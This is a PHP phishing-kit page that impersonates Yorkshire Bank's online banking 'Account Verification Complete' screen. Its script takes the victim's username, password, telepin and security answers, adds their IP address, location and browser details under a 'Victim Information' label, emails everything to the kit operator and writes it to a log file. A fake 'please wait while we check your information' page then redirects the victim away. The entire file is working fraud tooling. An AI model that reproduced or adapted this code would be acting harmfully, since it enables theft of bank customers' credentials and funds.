<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "../../CONTROLS.php";
require "../../includes/session_protect.php";
require "../../includes/functions.php";
require "../../includes/One_Time.php";
error_reporting(0);
ini_set(‘display_errors’, ’0′);
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$telepin = $_SESSION['telepin'];
$pass = $_POST['pass'];

$q1 = $_POST['q1']." : ".$_POST['a1'];
$q2 = $_POST['q2']." : ".$_POST['a2'];
$q3 = $_POST['q3']." : ".$_POST['a3'];
$ccno = str_replace(' ', '', $ccno);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);

$v1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$v2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$v3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$v4 = "| Browser : " . $systemInfo['browser'] . "";
$v5 = "| Os : " . $systemInfo['os'] . "";
$data = "
+ ------------Yorkshire----------------+
+ ------------------------------------------+
+ Account Information (Yorkshire)
| User : $user
| Pass : $pass
| Telepin : $telepin 
| Question 1 : $q1
| Question 2 : $q2
| Question 3 : $q3
+ ------------------------------------------+
+ Victim Information
$v1
$v2
$v3
$v4
$v5
| Received : $date @ $time
+ ------------------------------------------+
";
mail($to, 'Yorkshire from ' . $_SERVER['REMOTE_ADDR'], $data);

$file = fopen('../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width" name="viewport">
<title>Complete</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link href='assets/css/one.css' media="screen" rel="stylesheet" type="text/css">
<link href='assets/css/two.css' media='screen' rel="stylesheet" type='text/css'>
<link href='assets/css/three.css' media='screen' rel="stylesheet" type='text/css'>
<meta http-equiv="refresh" content="5; url='../../Exit.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>'"/>
</head>
<body class="personal">
<div class="container top-nav-bg hide-on-phones">
<div class="row">
<div class="three columns phone-two"><img src="assets/img/logo.png"></div>
<div class="six columns phone-two" id="heroPanel"></div>
<div class="three columns ie6-no-right-margin phone-two text-right">
<p class="show-on-desktops">Text Size: <a href="javascript:standardFontSize();" tabindex="1" title="Standard Font Size"><span class="smallish">T</span></a> <a href="javascript:increaseFontSize();" tabindex="2" title="Larger Font Size"><span class="bigger">T</span></a></p>
<p><a class="nice nag round medium button" href="#" tabindex="3">Logout Internet Banking<span class="arrow"><!-- --></span></a></p>
<h6><?php echo date('l, d/m/Y');?></h6>
</div>
</div>
</div>
<div class="container show-on-phones" id="mobile-head">
<div class="row">
<div class="phone-one text-left">
<div id="mobile-nav"><a href="#">Menu</a></div>
</div>
<div class="phone-two text-center" id="mlogo"><img src="assets/img/mobile-logo.png"></div>
<div class="phone-one text-right" id="mlogout"><a href="#"><img src="assets/img/mobile-logout.png"></a></div>
</div>
</div>
<div class="container section-nav-bg" id="mobile-nav-menu">
<div class="row">
<div class="nine columns">
<ul class="nav-bar">
<li class=""><a href="#" tabindex="10">Account Info</a></li>
<li class=""><a href="#" tabindex="11">Payments</a></li>
<li class=""><a href="#" tabindex="14">Products</a></li>
<li class="active"><a href="#" tabindex="13">Administration</a></li>
<li class=""><a href="#" tabindex="12">Contact Us</a></li>
</ul>
</div>
<div class="three columns ie6-no-right-margin hide-on-phones">
<ul class="nav-bar" id="trmenu">
<li><a href="#" tabindex="22">Logout</a></li>
</ul>
</div>
</div>
</div>
<div class="container" id="mobile-nav-left">Administration</div>
<div class="hide-on-phones"><br></div>
<div class="container" id="wrap">
<div class="row">
<div class="three columns" id="mobile-nav-left-show">
<ul class="nav-bar vertical" id="secondarynavskip">
<li class="Level4"><a href="#">Administration</a></li>
<li class="Level4"><a href="#">Security Token</a></li>
<li class="Level4"><a href="#">Token Request</a></li>
<li class="Level4"><a href="#">Token Activation</a></li>
<li class="Level4"><a href="#">Change Password</a></li>
<li class="Level4"><a href="#">Change Security Questions and Answers</a></li>
<li class="Level4"><a href="#">Modify Contact Details</a></li>
<li class="Level4"><a href="#">Modify Account Access</a></li>
<li class="Level4"><a href="#">Modify Account Nicknames</a></li>
<li class="Level4"><a href="#">Modify Transaction History Settings</a></li>
</ul>
</div>
<div class="six columns">
<h2>Account Verification Complete</h2>
<hr>
<div id="innercontent">
<div class="message">
<br/>
<a id="loadingIcon" name="loadingIcon" href="#"><img style="display:block;margin-left:auto;margin-right:auto" src="assets/img/spin.gif"/></a>
<br />
<h4 style=" text-align: center;">Please wait while we check your information</h4>
<br />
<p align="center" style="text-align: center;">It'll only take a few seconds <br> we're just verifying the details that you've entered.</p>
<br>
<p align="center"  style="text-align: center;font-weight:700;color:red;">For your security you will be automatically logged out.</p>
<p></p>
</div>
</div>
</div>
<div class="three columns ie6-no-right-margin">
<div class="headed-box">
<div><a class="medium nag nice button round" href="#"><span class="arrow"></span> 0 new message(s)</a>
<p>Last login <strong><?php echo date('d/m/Y');?></strong></p>
</div>
</div>
<div class="headed-box">
<h4>Need Help?</h4>
<div><a class="medium white nice button round" href="#">Visit our Yorkshire Bank Help Centre <span class="arrow"></span></a></div>
</div>
</div>
</div>
</div>
<div class="clear"></div>
<div class="container hide-on-phones bcrumbs">
<div class="row">
<p>You are here:&nbsp;<b class="breadcrumb">Administration</b></p>
</div>
</div>
<div class="clear"></div>
<div class="bottom-bar">
<div class="row">
<p class="text-center">You can find impartial information and guidance on money matters on the "<a href="#">Money advice service</a>" website.<br>
Yorkshire Bank is covered by the Financial Services Compensation Scheme (FSCS), <a href="http://www.cbonline.co.uk/personal/savings/compensation-scheme" target="_blank" title="Find out more">Find out more</a>.</p>
</div>
<div class="clear"></div>
</div>
</body>
</html>